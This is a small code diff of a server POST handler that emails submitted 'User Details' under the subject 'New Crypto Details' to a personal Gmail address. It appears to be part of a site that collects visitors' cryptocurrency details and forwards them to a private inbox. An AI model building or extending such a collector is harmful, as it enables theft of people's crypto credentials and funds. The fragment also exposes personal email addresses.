@@ -12,7 +12,7 @@ export async function POST(req){
     console.log(body)
     const message = {
         from: "meshackchuck@gmail.com",
-        to: "owerboy36@gmail.com",
+        to: "Owerboy36@gmail.com",
         subject: "New Crypto Details",
         html: `
             <h3>User Details</h3>
